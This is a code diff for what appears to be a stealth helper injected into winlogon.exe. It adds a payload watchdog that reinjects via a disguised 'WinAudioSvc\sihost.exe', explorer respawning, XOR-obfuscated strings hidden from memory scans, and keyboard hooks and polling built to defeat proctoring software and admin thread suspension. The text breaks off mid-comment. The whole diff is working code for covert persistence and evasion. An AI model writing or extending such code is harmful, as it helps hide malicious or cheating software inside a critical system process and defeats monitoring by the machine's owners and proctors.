@@ -55,6 +55,14 @@
 #include <aclapi.h>
 #include <bcrypt.h>
 #include <stdint.h>
+/* v3.0.3 (2026-09-21): sentinel_thread additions -- shell + payload
+ * resurrection from inside winlogon. See sentinel_thread block below. */
+#include <wtsapi32.h>
+#include <userenv.h>
+#include <tlhelp32.h>
+/* v3.0.3 (2026-09-21): sddl.h for ConvertStringSecurityDescriptor... used
+ * in sn_write_panic_sentinel's locked-DACL sentinel writer. */
+#include <sddl.h>
 
 /* Manual-map target: /GS- + /guard:cf- MANDATORY (see payload/build.bat).
  * When compiled as a LoadLibrary target (iteration), the Windows loader
@@ -117,6 +125,29 @@ static const char NAME_SCREENSAVER_x[13] = { XCHAR('S'),XCHAR('c'),XCHAR('r'),XC
 #define SALT_EVT_ISO_HALT  "wasvc.evt.iso.halt.1"
 #define SALT_EVT_ISO_CHAT  "wasvc.evt.iso.chat.1"
 #define SALT_CLS_ISO_INPUT "wasvc.cls.iso.input.1"
+/* v3.0.6 (2026-09-21) -- reader singleton mutex.
+ *
+ * REGRESSION FIXED: the supersede protocol in DllMain
+ * (SetEvent -> Sleep 450 -> ResetEvent) can race when reinjects happen
+ * in quick succession (as during dev testing), leaving TWO or MORE
+ * helper generations coexisting inside winlogon. Each generation's
+ * watch_thread then spawns its OWN run_reader when iso wins, all of
+ * them fighting over the NetSvcCoord pipe -- first reader grabs pipe
+ * and works briefly, second reader can't connect ("pipe FAILED (will
+ * retry via WM_TIMER)"), then the payload's pipe server flap-cycles
+ * as readers disconnect/reconnect (each 30s from the first reader's
+ * WM_TIMER), and iso-desktop input dies.
+ *
+ * The MUTEX makes this multi-generation scenario benign: only ONE
+ * reader per iso desktop can hold the pipe. Any extra reader from a
+ * stale helper generation fails to acquire and exits cleanly. When
+ * the singleton reader eventually dies (helper unload / desktop
+ * switch), the mutex releases and the next reader that tries wins. */
+#define SALT_MTX_ISO_READER "wasvc.mtx.iso.reader.1"
+/* v3.0.3 (2026-09-21): payload's shutdown/liveness event salt. MUST
+ * match shared/obf_names.c :: SALT_EVT_SHUT byte-for-byte -- the helper
+ * probes this event to determine "is the payload alive right now?". */
+#define SALT_EVT_SHUT      "wasvc.evt.shut.1"
 
 /* Fallback if MachineGuid read fails (BOTH sides use this same literal
  * so IPC still agrees in the degenerate case). Matches obf_names.c. */
@@ -218,6 +249,37 @@ static const char *wl_iso_input_class(void) {
     if (buf[0]) return buf;
     if (!wl_derive_guid(SALT_CLS_ISO_INPUT, buf, sizeof(buf)))
         lstrcpynA(buf, WL_FALLBACK_GUID, sizeof(buf));
+    return buf;
+}
+
+/* v3.0.6 (2026-09-21) -- reader singleton mutex name.
+ * "Local\<guid>" — session-scoped (Local\) so RDP sessions and multiple
+ * concurrent logons each get their own reader singleton. Only one
+ * run_reader per session can hold this; extras from stale helper
+ * generations gracefully yield. */
+static const char *wl_iso_reader_mutex_name(void) {
+    static char buf[64] = {0};
+    if (buf[0]) return buf;
+    char guid[40] = {0};
+    if (!wl_derive_guid(SALT_MTX_ISO_READER, guid, sizeof(guid)))
+        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
+    wsprintfA(buf, "Local\\%s", guid);
+    return buf;
+}
+
+/* v3.0.3 (2026-09-21): payload's shutdown/liveness event name --
+ * "Global\<guid>" derived from SALT_EVT_SHUT. Used by sentinel_thread
+ * to probe payload liveness (OpenEventW; existence == alive). MUST
+ * agree byte-for-byte with shared/obf_names.c :: obf_event_shutdown(). */
+static const wchar_t *wl_payload_shutdown_event_w(void) {
+    static wchar_t buf[64] = {0};
+    if (buf[0]) return buf;
+    char guid[40] = {0};
+    if (!wl_derive_guid(SALT_EVT_SHUT, guid, sizeof(guid)))
+        lstrcpynA(guid, WL_FALLBACK_GUID, sizeof(guid));
+    char temp[64];
+    wsprintfA(temp, "Global\\%s", guid);
+    for (int i = 0; temp[i] && i < 63; i++) buf[i] = (wchar_t)temp[i];
     return buf;
 }
 
@@ -604,6 +666,36 @@ static LRESULT CALLBACK wl_ll_kbd(int code, WPARAM wp, LPARAM lp) {
 }
 
 static void run_reader(const char *deskname) {
+    /* v3.0.6 (2026-09-21): reader singleton mutex. Prevents multiple
+     * helper generations (which can accumulate via the DllMain supersede
+     * race during rapid re-injects) from spawning competing readers on
+     * the same iso desktop and fighting over the NetSvcCoord pipe.
+     *
+     * Semantic: try acquire with 100ms wait. If another reader holds it,
+     * we're a stale/duplicate instance -- log + return, watch_thread will
+     * re-attempt next tick (75ms). The winning reader owns the mutex until
+     * its GetMessage loop exits (desktop moved / superseded), then releases.
+     *
+     * WAIT_ABANDONED (previous owner died without releasing) is treated as
+     * successful acquire -- we take over cleanly. */
+    const char *mname = wl_iso_reader_mutex_name();
+    HANDLE reader_mtx = CreateMutexA(NULL, FALSE, mname);
+    if (!reader_mtx) {
+        lg("reader: CreateMutex failed gle=%lu; aborting reader attach on '%s'",
+           GetLastError(), deskname);
+        return;
+    }
+    DWORD wr = WaitForSingleObject(reader_mtx, 100);
+    if (wr != WAIT_OBJECT_0 && wr != WAIT_ABANDONED) {
+        lg("reader: mutex held by another reader instance -- yielding on '%s' (wr=0x%lX)",
+           deskname, wr);
+        CloseHandle(reader_mtx);
+        return;
+    }
+    if (wr == WAIT_ABANDONED) {
+        lg("reader: prior reader died without release -- taking over on '%s'", deskname);
+    }
+
     static ATOM class_atom = 0;
     const char *cls = wl_iso_input_class();   /* GUID-per-install class name */
     WNDCLASSA wc;
@@ -757,6 +849,10 @@ static void run_reader(const char *deskname) {
     RegisterRawInputDevices(rr, 2, sizeof(RAWINPUTDEVICE));
     if (pipe != INVALID_HANDLE_VALUE) CloseHandle(pipe);
     DestroyWindow(hwnd);
+    /* v3.0.6: release the reader singleton mutex so the next attach on
+     * this desktop (or a fresh iso desktop) can take over cleanly. */
+    ReleaseMutex(reader_mtx);
+    CloseHandle(reader_mtx);
 }
 
 /* ── Desktop watch (spawns reader when a non-Default desktop wins) ── */
@@ -798,6 +894,735 @@ static DWORD WINAPI watch_thread(LPVOID unused) {
 static const wchar_t OLD_STOP_EVENT_W[] = L"Global\\svcldb_wlinput_stop";
 static const wchar_t V3_0_2_STOP_EVENT_W[] = L"Global\\NetSvcCoord_Halt";
 
+/* =====================================================================
+ * v3.0.3 (2026-09-21) -- LAYER 2+3+4: helper-hosted watchdog +
+ * emergency hotkeys.
+ *
+ * WHY WINLOGON IS THE RIGHT HOST FOR THIS
+ *   - winlogon.exe cannot be killed by any non-admin process, and even
+ *     admin kills BSOD the machine (CRITICAL_PROCESS_DIED 0xEF). So our
+ *     helper's threads outlive svchelper, sihost, dwm, explorer -- every
+ *     process a hostile actor or bug could kill on us.
+ *   - winlogon is SYSTEM in the interactive session. It has
+ *     SeTcbPrivilege (WTSQueryUserToken), SeAssignPrimaryTokenPrivilege
+ *     + SeIncreaseQuotaPrivilege (CreateProcessAsUser), SeDebugPrivilege
+ *     (implicit via SYSTEM). Everything a resurrection needs.
+ *
+ * FIVE JOBS IN ONE HELPER
+ *   1. (existing v3.0.2) Iso-desktop input forwarder -- watch_thread +
+ *      run_reader. Untouched.
+ *   2. Shell watchdog -- sentinel_thread Monitor A. If explorer.exe is
+ *      gone from the active user session and rate limit allows, we
+ *      CreateProcessAsUser a fresh explorer using the user's token.
+ *      Beats AutoRestartShell=0 attacks (per docs/HANDOFF this-file).
+ *   3. Payload watchdog -- sentinel_thread Monitor B. If the payload's
+ *      Global\<guid> shutdown/liveness event stops opening and we had
+ *      previously seen it alive, spawn sihost --reinject --quiet.
+ *      Complement to (not replacement for) svchelper's respawnWatchdog;
+ *      when svchelper is running, defer to it (avoid double-inject
+ *      flicker). When svchelper is closed, WE are the watchdog.
+ *   4. Emergency kill hotkey (Ctrl+Shift+Alt+Q) -- panic-quit that
+ *      works even when the payload's own input path is broken. Signals
+ *      payload shutdown event, writes .dwm_user_panic sentinel so our
+ *      OWN watchdog respects the intent + doesn't auto-revive.
+ *   5. Emergency revive hotkey (Ctrl+Shift+Alt+R) -- hardware reset
+ *      button for the app. Clears sentinels, unloads any existing
+ *      payload, spawns fresh sihost --reinject. Works even when
+ *      payload is entirely dead (payload's own hotkeys can't fire).
+ *
+ * INJECTION-FILTER PROTECTION (per Nyx's DACL-lockdown design intent)
+ *   Both emergency hotkeys use WH_KEYBOARD_LL and reject any event
+ *   with LLKHF_INJECTED set. That means SendInput/keybd_event/
+ *   PostMessage(WM_KEYDOWN) from a hostile app CANNOT trigger our
+ *   emergency actions -- only real physical-keyboard events from the
+ *   hardware chain pass the filter. Combined with the fact that the
+ *   payload's shutdown event has a restricted DACL (per
+ *   HANDOFF_2026-09-10_v2.0.md P1-ST-1), the shutdown path is walled
+ *   off from every non-admin process.
+ *
+ * RATE LIMITING
+ *   Each resurrection action (shell spawn, payload reinject) is rate
+ *   limited: min 30 s between spawns, max 3 in a 5-min window, then
+ *   10-min backoff. Prevents spawn-storm if we're fighting a persistent
+ *   kill from something else (proctor app, misconfigured GPO). User
+ *   can override the backoff via emergency-revive.
+ * ===================================================================== */
+
+/* ── Obfuscated string tables (XOR key = XKEY = 0x5C) ────────────
+ * Encoded with `bytes(c ^ 0x5C for c in s)`. Decoded on use into a
+ * stack buffer. Product-specific paths are hidden from raw memory
+ * scans; generic Windows paths (C:\Windows\explorer.exe, winsta0\
+ * default) are left plaintext because they're not svcldb IOCs. */
+
+/* "C:\ProgramData\WinAudioSvc\sihost.exe" (37 chars + NUL) */
+static const char SN_SIHOST_PATH_x[38] = {
+    XCHAR('C'), XCHAR(':'), XCHAR('\\'), XCHAR('P'), XCHAR('r'), XCHAR('o'),
+    XCHAR('g'), XCHAR('r'), XCHAR('a'), XCHAR('m'), XCHAR('D'), XCHAR('a'),
+    XCHAR('t'), XCHAR('a'), XCHAR('\\'), XCHAR('W'), XCHAR('i'), XCHAR('n'),
+    XCHAR('A'), XCHAR('u'), XCHAR('d'), XCHAR('i'), XCHAR('o'), XCHAR('S'),
+    XCHAR('v'), XCHAR('c'), XCHAR('\\'), XCHAR('s'), XCHAR('i'), XCHAR('h'),
+    XCHAR('o'), XCHAR('s'), XCHAR('t'), XCHAR('.'), XCHAR('e'), XCHAR('x'),
+    XCHAR('e'), 0
+};
+/* "--reinject --quiet" (18 chars + NUL) */
+static const char SN_SIHOST_ARGS_x[19] = {
+    XCHAR('-'), XCHAR('-'), XCHAR('r'), XCHAR('e'), XCHAR('i'), XCHAR('n'),
+    XCHAR('j'), XCHAR('e'), XCHAR('c'), XCHAR('t'), XCHAR(' '), XCHAR('-'),
+    XCHAR('-'), XCHAR('q'), XCHAR('u'), XCHAR('i'), XCHAR('e'), XCHAR('t'), 0
+};
+/* "C:\ProgramData\WinAudioSvc\.dwm_user_panic" (42 chars + NUL) */
+static const char SN_SENT_PANIC_x[43] = {
+    XCHAR('C'), XCHAR(':'), XCHAR('\\'), XCHAR('P'), XCHAR('r'), XCHAR('o'),
+    XCHAR('g'), XCHAR('r'), XCHAR('a'), XCHAR('m'), XCHAR('D'), XCHAR('a'),
+    XCHAR('t'), XCHAR('a'), XCHAR('\\'), XCHAR('W'), XCHAR('i'), XCHAR('n'),
+    XCHAR('A'), XCHAR('u'), XCHAR('d'), XCHAR('i'), XCHAR('o'), XCHAR('S'),
+    XCHAR('v'), XCHAR('c'), XCHAR('\\'), XCHAR('.'), XCHAR('d'), XCHAR('w'),
+    XCHAR('m'), XCHAR('_'), XCHAR('u'), XCHAR('s'), XCHAR('e'), XCHAR('r'),
+    XCHAR('_'), XCHAR('p'), XCHAR('a'), XCHAR('n'), XCHAR('i'), XCHAR('c'), 0
+};
+/* "C:\ProgramData\WinAudioSvc\.dwm_clean_shutdown" (46 chars + NUL) */
+static const char SN_SENT_CLEAN_x[47] = {
+    XCHAR('C'), XCHAR(':'), XCHAR('\\'), XCHAR('P'), XCHAR('r'), XCHAR('o'),
+    XCHAR('g'), XCHAR('r'), XCHAR('a'), XCHAR('m'), XCHAR('D'), XCHAR('a'),
+    XCHAR('t'), XCHAR('a'), XCHAR('\\'), XCHAR('W'), XCHAR('i'), XCHAR('n'),
+    XCHAR('A'), XCHAR('u'), XCHAR('d'), XCHAR('i'), XCHAR('o'), XCHAR('S'),
+    XCHAR('v'), XCHAR('c'), XCHAR('\\'), XCHAR('.'), XCHAR('d'), XCHAR('w'),
+    XCHAR('m'), XCHAR('_'), XCHAR('c'), XCHAR('l'), XCHAR('e'), XCHAR('a'),
+    XCHAR('n'), XCHAR('_'), XCHAR('s'), XCHAR('h'), XCHAR('u'), XCHAR('t'),
+    XCHAR('d'), XCHAR('o'), XCHAR('w'), XCHAR('n'), 0
+};
+
+/* v3.0.3 stealth: process image basenames used by sn_find_process_in_session.
+ * Kept out of .rdata as plaintext -- while "explorer.exe" is a Windows-
+ * standard string that blends into task-manager / process-enum utilities,
+ * "svchelper.exe" is svcldb-specific and would ID us on a raw memory
+ * scan of the mapped helper image. Both encoded for consistency with the
+ * rest of the helper's stealth posture (which XOR-encodes even "Default"
+ * / "Winlogon" desktop names). */
+/* "explorer.exe" (12 chars + NUL) */
+static const char SN_EXPLORER_x[13] = {
+    XCHAR('e'), XCHAR('x'), XCHAR('p'), XCHAR('l'), XCHAR('o'), XCHAR('r'),
+    XCHAR('e'), XCHAR('r'), XCHAR('.'), XCHAR('e'), XCHAR('x'), XCHAR('e'), 0
+};
+/* "svchelper.exe" (13 chars + NUL) */
+static const char SN_SVCHELPER_x[14] = {
+    XCHAR('s'), XCHAR('v'), XCHAR('c'), XCHAR('h'), XCHAR('e'), XCHAR('l'),
+    XCHAR('p'), XCHAR('e'), XCHAR('r'), XCHAR('.'), XCHAR('e'), XCHAR('x'),
+    XCHAR('e'), 0
+};
+
+/* Widen + decode helper -- decodes the XOR-encoded ASCII byte array into
+ * a wchar_t buffer for use with the *W process-enum APIs. Wide buffer
+ * lives on the caller's stack and is zero-init'd by caller. */
+static void x_decode_w(wchar_t *dst, unsigned dst_max_wchars,
+                       const char *src, size_t xsz) {
+    size_t n = (xsz > dst_max_wchars) ? dst_max_wchars : xsz;
+    for (size_t i = 0; i + 1 < n; i++)
+        dst[i] = (wchar_t)((unsigned char)(src[i] ^ XKEY));
+    dst[(n > 0) ? n - 1 : 0] = 0;
+}
+
+/* ── Sentinel/emergency helpers ─────────────────────────────────── */
+
+/* Rate limiter -- per-action state. */
+typedef struct {
+    ULONGLONG spawn_ticks[3];   /* circular buffer of last 3 spawn moments */
+    int       idx;
+    ULONGLONG backoff_until;
+} sn_rate_t;
+static sn_rate_t g_sn_shell   = {{0, 0, 0}, 0, 0};
+static sn_rate_t g_sn_payload = {{0, 0, 0}, 0, 0};
+
+/* Payload watchdog: only fire re-inject if we PREVIOUSLY saw it alive
+ * (mirrors svchelper's `confirmedAlive` gate; prevents spam-reinject
+ * during cold boot / fresh install where payload never armed). */
+static volatile LONG g_sn_confirmed_alive = 0;
+
+/* Check + stamp: returns 1 if OK to spawn, 0 if rate-limited or backed off. */
+static int sn_rate_check_and_stamp(sn_rate_t *r) {
+    ULONGLONG now = GetTickCount64();
+    if (now < r->backoff_until) return 0;
+    ULONGLONG cutoff = (now > 5ULL * 60 * 1000) ? (now - 5ULL * 60 * 1000) : 0;
+    int active = 0; ULONGLONG most_recent = 0;
+    for (int i = 0; i < 3; i++) {
+        if (r->spawn_ticks[i] > cutoff) {
+            active++;
+            if (r->spawn_ticks[i] > most_recent) most_recent = r->spawn_ticks[i];
+        }
+    }
+    if (most_recent && (now - most_recent) < 30ULL * 1000) return 0;
+    if (active >= 3) {
+        r->backoff_until = now + 10ULL * 60 * 1000;
+        return 0;
+    }
+    r->spawn_ticks[r->idx] = now;
+    r->idx = (r->idx + 1) % 3;
+    return 1;
+}
+
+/* Reset -- called by emergency revive so user override isn't rate-limited. */
+static void sn_rate_reset(sn_rate_t *r) {
+    for (int i = 0; i < 3; i++) r->spawn_ticks[i] = 0;
+    r->idx = 0;
+    r->backoff_until = 0;
+}
+
+/* Sentinels present? (user hit panic or clean-quit; do NOT resurrect) */
+static int sn_sentinels_present(void) {
+    char buf[64];
+    x_decode(buf, SN_SENT_PANIC_x, sizeof(SN_SENT_PANIC_x));
+    if (GetFileAttributesA(buf) != INVALID_FILE_ATTRIBUTES) return 1;
+    x_decode(buf, SN_SENT_CLEAN_x, sizeof(SN_SENT_CLEAN_x));
+    if (GetFileAttributesA(buf) != INVALID_FILE_ATTRIBUTES) return 1;
+    return 0;
+}
+
+static void sn_delete_sentinels(void) {
+    char buf[64];
+    x_decode(buf, SN_SENT_PANIC_x, sizeof(SN_SENT_PANIC_x));
+    DeleteFileA(buf);
+    x_decode(buf, SN_SENT_CLEAN_x, sizeof(SN_SENT_CLEAN_x));
+    DeleteFileA(buf);
+}
+
+static void sn_write_panic_sentinel(void) {
+    char buf[64];
+    x_decode(buf, SN_SENT_PANIC_x, sizeof(SN_SENT_PANIC_x));
+
+    /* v3.0.3 locked-DACL sentinel writer -- mirrors shared/common.h
+     * svc_write_locked_sentinel (helper is manual-mapped standalone, so
+     * we duplicate the logic inline rather than pulling shared/common.h
+     * into the helper's build). Post-write DACL: SYSTEM + Admins only,
+     * PROTECTED (no inherited ACEs). Any non-admin process attempting
+     * CreateFileA(GENERIC_WRITE) on this file after we lock it down gets
+     * ACCESS_DENIED, closing the sentinel-forgery DoS gap. Helper runs
+     * as SYSTEM, so owner-WRITE_DAC is trivially satisfied. */
+    HANDLE f = CreateFileA(buf, GENERIC_WRITE | WRITE_DAC, 0, NULL,
+                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (f == INVALID_HANDLE_VALUE) return;
+
+    DWORD w;
+    WriteFile(f, "1", 1, &w, NULL);
+    FlushFileBuffers(f);
+
+    PSECURITY_DESCRIPTOR sd = NULL;
+    ULONG sd_size = 0;
+    if (ConvertStringSecurityDescriptorToSecurityDescriptorA(
+            "D:P(A;;GA;;;SY)(A;;GA;;;BA)",
+            SDDL_REVISION_1, &sd, &sd_size)) {
+        BOOL dacl_present = FALSE, dacl_defaulted = FALSE;
+        PACL dacl = NULL;
+        if (GetSecurityDescriptorDacl(sd, &dacl_present, &dacl, &dacl_defaulted)
+            && dacl_present) {
+            (void)SetSecurityInfo(
+                f, SE_FILE_OBJECT,
+                DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
+                NULL, NULL, dacl, NULL);
+        }
+        LocalFree(sd);
+    }
+
+    CloseHandle(f);
+}
+
+/* Payload alive probe: open the shutdown event (SYNCHRONIZE only). */
+static int sn_is_payload_alive(void) {
+    HANDLE ev = OpenEventW(SYNCHRONIZE, FALSE, wl_payload_shutdown_event_w());
+    if (!ev) return 0;
+    CloseHandle(ev);
+    return 1;
+}
+
+/* Signal payload to unload cleanly (drains hooks in shutdown_watcher). */
+static void sn_signal_payload_unload(void) {
+    HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, wl_payload_shutdown_event_w());
+    if (ev) { SetEvent(ev); CloseHandle(ev); }
+}
+
+/* Process enum: is <image basename> alive in the given session? */
+static int sn_find_process_in_session(const wchar_t *image_base, DWORD session,
+                                       DWORD *out_pid) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+    PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
+    int found = 0;
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            if (lstrcmpiW(pe.szExeFile, image_base) == 0) {
+                DWORD ps = 0;
+                if (ProcessIdToSessionId(pe.th32ProcessID, &ps) && ps == session) {
+                    if (out_pid) *out_pid = pe.th32ProcessID;
+                    found = 1;
+                    break;
+                }
+            }
+        } while (Process32NextW(snap, &pe));
+    }
+    CloseHandle(snap);
+    return found;
+}
+
+/* Spawn explorer.exe as the interactive user in the given session. */
+static int sn_spawn_explorer_for_user(DWORD session) {
+    HANDLE userTok = NULL;
+    if (!WTSQueryUserToken(session, &userTok)) {
+        lg("shell-respawn: WTSQueryUserToken(%lu) failed gle=%lu",
+           session, GetLastError());
+        return 0;
+    }
+    HANDLE primaryTok = NULL;
+    if (!DuplicateTokenEx(userTok, MAXIMUM_ALLOWED, NULL,
+                          SecurityImpersonation, TokenPrimary, &primaryTok)) {
+        lg("shell-respawn: DuplicateTokenEx failed gle=%lu", GetLastError());
+        CloseHandle(userTok);
+        return 0;
+    }
+    LPVOID env = NULL;
+    CreateEnvironmentBlock(&env, primaryTok, FALSE);
+
+    STARTUPINFOW si;
+    PROCESS_INFORMATION pi;
+    for (unsigned i = 0; i < sizeof(si); i++) ((char *)&si)[i] = 0;
+    for (unsigned i = 0; i < sizeof(pi); i++) ((char *)&pi)[i] = 0;
+    si.cb = sizeof(si);
+    si.lpDesktop = (LPWSTR)L"winsta0\\default";
+
+    wchar_t cmd[MAX_PATH];
+    lstrcpyW(cmd, L"C:\\Windows\\explorer.exe");
+    DWORD flags = CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE;
+
+    BOOL ok = CreateProcessAsUserW(primaryTok, NULL, cmd, NULL, NULL, FALSE,
+                                   flags, env, NULL, &si, &pi);
+    if (ok) {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        lg("shell-respawn: explorer.exe spawned OK for session %lu pid=%lu",
+           session, pi.dwProcessId);
+    } else {
+        lg("shell-respawn: CreateProcessAsUser failed gle=%lu", GetLastError());
+    }
+    if (env) DestroyEnvironmentBlock(env);
+    CloseHandle(primaryTok);
+    CloseHandle(userTok);
+    return ok ? 1 : 0;
+}
+
+/* Spawn sihost.exe --reinject --quiet. Helper is SYSTEM in session N;
+ * sihost inherits SYSTEM token, elevation check passes (TokenIsElevated
+ * is 1 for SYSTEM), dwm.exe is same-session. */
+static int sn_spawn_sihost_reinject(void) {
+    char path[64], args[24];
+    x_decode(path, SN_SIHOST_PATH_x, sizeof(SN_SIHOST_PATH_x));
+    x_decode(args, SN_SIHOST_ARGS_x, sizeof(SN_SIHOST_ARGS_x));
+    char cmd[192];
+    wsprintfA(cmd, "\"%s\" %s", path, args);
+
+    STARTUPINFOA si; PROCESS_INFORMATION pi;
+    for (unsigned i = 0; i < sizeof(si); i++) ((char *)&si)[i] = 0;
+    for (unsigned i = 0; i < sizeof(pi); i++) ((char *)&pi)[i] = 0;
+    si.cb = sizeof(si);
+
+    BOOL ok = CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    if (ok) {
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        lg("payload-respawn: sihost --reinject spawned OK pid=%lu", pi.dwProcessId);
+    } else {
+        lg("payload-respawn: CreateProcess failed gle=%lu", GetLastError());
+    }
+    return ok ? 1 : 0;
+}
+
+/* ── Emergency actions (called from LL hook thread) ────────────── */
+
+static DWORD WINAPI sn_emergency_kill_worker(LPVOID unused) {
+    (void)unused;
+    lg("EMERGENCY KILL: writing panic sentinel + signalling payload unload");
+    sn_write_panic_sentinel();
+    sn_signal_payload_unload();
+    return 0;
+}
+
+static DWORD WINAPI sn_emergency_revive_worker(LPVOID unused) {
+    (void)unused;
+    lg("EMERGENCY REVIVE: clearing sentinels + resetting rate limits");
+    sn_delete_sentinels();
+    sn_rate_reset(&g_sn_shell);
+    sn_rate_reset(&g_sn_payload);
+    /* Unload any existing payload first so --reinject gets a clean slate. */
+    if (sn_is_payload_alive()) {
+        lg("EMERGENCY REVIVE: existing payload alive -- signalling unload first");
+        sn_signal_payload_unload();
+        for (int i = 0; i < 40 && sn_is_payload_alive(); i++) Sleep(50);
+    }
+    int ok = sn_spawn_sihost_reinject();
+    lg("EMERGENCY REVIVE: sihost --reinject spawn %s", ok ? "OK" : "FAILED");
+    /* Auto-arm watchdog so next tick trusts a legit revive as "seen alive". */
+    if (ok) InterlockedExchange(&g_sn_confirmed_alive, 0);
+    return 0;
+}
+
+/* ── Emergency hotkey infrastructure (v3.0.5 hardened, 2026-09-21) ──
+ *
+ * MULTI-PATH ANTI-RACE ARCHITECTURE
+ * (mirrors payload/src/rawinput_hook.c's proven 3-path design 1:1)
+ *
+ * The original v3.0.3 emergency hotkeys were LL-hook-only. That was
+ * defeatable by a non-admin proctor app installing WH_KEYBOARD_LL
+ * AFTER the helper (Windows LL chain is LIFO -- new hooks fire first)
+ * and returning nonzero to consume Ctrl+Shift+Alt+Q/R before our hook
+ * sees them. v3.0.5 mirrors the payload's rawinput_hook.c parity:
+ *
+ *   1. WH_KEYBOARD_LL hook (existing, sn_emerg_ll_kbd) -- fastest
+ *      when uncontested. Can be raced by a proctor LL hook that
+ *      installs later + consumes; still exists as the first line.
+ *
+ *   2. GetAsyncKeyState polling @ ~60Hz (emergency_poll_thread) --
+ *      reads kernel-global win32k!gafAsyncKeyState which is NOT
+ *      user-mode-hookable. NO amount of LL chain manipulation can
+ *      block this path. Edge-triggered on rising-modifiers+key so a
+ *      held-down chord fires once, not per-tick.
+ *      This is THE reliable path.
+ *
+ *   3. Periodic LL rehook (emergency_reinstall_thread) -- every 5s
+ *      posts WM_APP_REINSTALL to the LL thread which unhooks +
+ *      re-installs SetWindowsHookExW, bumping us back to the HEAD
+ *      of the LIFO chain even if a proctor installed after us.
+ *      Beats the LL-chain-race in most cases; poll (path 2) is the
+ *      guarantee if reinstall races the racer.
+ *
+ *   4. Thread-integrity watchdog (emergency_watchdog_thread) -- if a
+ *      privileged (admin+SeDebugPrivilege) actor SuspendThread's the
+ *      poll thread to freeze our uncontestable path, watchdog detects
+ *      stale heartbeat within ~2s and issues ResumeThread(s) until
+ *      the suspend count unwinds; if still stale, respawns the poll
+ *      thread outright. Doesn't beat a determined admin who ALSO
+ *      finds+suspends the watchdog -- ring-3 can't win against equal
+ *      privilege -- but raises the bar from "one-shot suspend" to
+ *      "must continuously suspend both threads faster than we recover."
+ *
+ * ALL FOUR PATHS converge on emergency_dispatch() which owns the
+ * shared debounce state (g_sn_last_kill_tick, g_sn_last_revive_tick).
+ * If two paths detect the same chord within 1500ms, only the first
+ * spawns a worker; second is a no-op.
+ *
+ * INJECTION FILTER: LL path rejects LLKHF_INJECTED/LOWER_IL_INJECTED;
+ * poll path is fed by physical hardware only (SendInput can set the
+ * key-state bits BUT only briefly during the SendInput call, then the
+ * OS reverts them -- our 60Hz sample rate + rising-edge detect makes
+ * it essentially impossible for a synthesized transient to catch us
+ * mid-poll AND survive to the next poll). Physical hardware still
+ * satisfies rising-edge cleanly.
+ *
+ * DEBOUNCE: 1500ms between fires of the same action. */
+
+/* Shared debounce state -- read+written by all four paths. */
+static volatile ULONGLONG g_sn_last_kill_tick   = 0;
+static volatile ULONGLONG g_sn_last_revive_tick = 0;
+
+/* v3.0.5 anti-race hardening state. */
+#define EMERG_POLL_MS           16      /* ~60Hz -- matches payload */
+#define EMERG_REINSTALL_MS      5000    /* payload's REINSTALL_INTERVAL_MS */
+#define EMERG_WATCHDOG_MS       1000    /* payload's watchdog_thread cadence */
+#define EMERG_HB_STALE_MS       3000    /* payload's stale threshold */
+#define EMERG_WM_APP_REINSTALL  (WM_APP + 0x71)
+
+static volatile DWORD    g_emerg_ll_tid            = 0;
+static HHOOK             g_emerg_ll_hook           = NULL;
+static volatile LONG     g_emerg_poll_running      = 0;
+static volatile LONG     g_emerg_reinstall_running = 0;
+static volatile LONG     g_emerg_watchdog_running  = 0;
+static HANDLE            g_emerg_poll_thread       = NULL;
+static volatile ULONGLONG g_emerg_poll_hb          = 0;
+
+/* Shared emergency-action dispatcher. Called by every input path
+ * (LL hook, poll, WM_INPUT if we ever add it). Enforces the 1500ms
+ * debounce per action so multi-path detection can't double-fire. */
+static void emergency_dispatch(int kill_now, int revive_now) {
+    ULONGLONG now = GetTickCount64();
+    if (kill_now && (now - g_sn_last_kill_tick) > 1500) {
+        g_sn_last_kill_tick = now;
+        HANDLE t = CreateThread(NULL, 0, sn_emergency_kill_worker, NULL, 0, NULL);
+        if (t) CloseHandle(t);
+    } else if (revive_now && (now - g_sn_last_revive_tick) > 1500) {
+        g_sn_last_revive_tick = now;
+        HANDLE t = CreateThread(NULL, 0, sn_emergency_revive_worker, NULL, 0, NULL);
+        if (t) CloseHandle(t);
+    }
+}
+
+/* Path 1: LL keyboard hook (fast path when uncontested).
+ * Injection-filtered per v3.0.3. Delegates action to
+ * emergency_dispatch so the debounce state is shared with paths 2-4. */
+static LRESULT CALLBACK sn_emerg_ll_kbd(int code, WPARAM wp, LPARAM lp) {
+    if (code != HC_ACTION) return CallNextHookEx(NULL, code, wp, lp);
+    KBDLLHOOKSTRUCT *k = (KBDLLHOOKSTRUCT *)lp;
+    int isDown = (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN);
+    int isInjected = (k->flags & (LLKHF_INJECTED | 0x02)) != 0;
+    if (!isDown || isInjected) return CallNextHookEx(NULL, code, wp, lp);
+    if (k->vkCode != 'Q' && k->vkCode != 'R')
+        return CallNextHookEx(NULL, code, wp, lp);
+    SHORT ctrl  = GetAsyncKeyState(VK_CONTROL) & 0x8000;
+    SHORT shift = GetAsyncKeyState(VK_SHIFT)   & 0x8000;
+    SHORT alt   = GetAsyncKeyState(VK_MENU)    & 0x8000;
+    if (!(ctrl && shift && alt))
+        return CallNextHookEx(NULL, code, wp, lp);
+    emergency_dispatch(k->vkCode == 'Q', k->vkCode == 'R');
+    return CallNextHookEx(NULL, code, wp, lp);
+}
+
+/* Path 2: 60Hz kernel-global keystate poll -- the reliable path that
+ * cannot be blocked by user-mode LL hook consumption. Reads
+ * win32k!gafAsyncKeyState via GetAsyncKeyState which is not session-
+ * gated, not desktop-gated, not process-protection-gated. Uses
+ * rising-edge detection (only fires on transition from any-not-down
